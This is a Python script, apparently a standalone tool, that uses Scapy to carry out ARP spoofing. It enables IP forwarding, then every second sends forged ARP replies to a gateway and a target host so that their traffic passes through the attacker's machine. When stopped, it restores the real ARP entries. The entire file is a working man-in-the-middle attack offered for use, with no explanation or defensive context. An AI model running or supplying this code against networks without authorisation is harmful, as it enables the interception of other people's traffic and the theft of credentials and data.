from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os


# Enables IP route (IP Forward) in Linux
def _enable_linux_iproute():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)

# Enables IP route (IP Forwarding) in Windows
def _enable_windows_iproute():
    from services import WService
    # Enabling Remote Access service
    service = WService("RemoteAccess")
    service.start()


# Enables IP forwarding
def enable_ip_route(verbose=True):
    if verbose:
        print("[!] Enabling IP Routing...")
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")

# Returns MAC address of any device connected to the network
def get_mac(ip):
    res, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=2, verbose=0)
    if res:
        return res[0][1].src
   
# Spoofs the gateway ip using ARP Poisoning
def spoof(gateway_ip, user_ip, verbose=True):
    # Getting the gateway MAC address
    gateway_mac = get_mac(gateway_ip)
    # Creating an ARP response
    resp = ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=user_ip, op='is-at')
    # send the packet
    send(resp, verbose=0)
    if verbose:
        # Get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(gateway_ip, user_ip, self_mac))

# Restores the normal process of a regular network
def restore(gateway_ip, user_ip, verbose=True):
    # Get the real and spoofed MAC addresses of gateway and user respectively
    gateway_mac = get_mac(gateway_ip)
    user_mac = get_mac(user_ip)

    # Creating and sending the restoring packet
    arp_response = ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=user_ip, hwsrc=user_mac)
    send(arp_response, verbose=0, count=5)
    
    # Printing info if needed
    if verbose:
        print("Sent to {} : {} is-at {}".format(gateway_ip, user_ip, user_mac))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoof Script")
    parser.add_argument("gateway")
    parser.add_argument("user")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()
    gateway, user, verbose = args.gateway, args.user, args.verbose

    enable_ip_route()
    try:
        while True:
            # Spoofing the gateway
            spoof(gateway, user, verbose)
            # Spoofing the user
            spoof(user, gateway, verbose)
            # Spoofing after each second
            time.sleep(1)
    except KeyboardInterrupt:
        print("Keyboard Interrupt! Restoring the network..")
        restore(gateway, user)
        restore(user, gateway)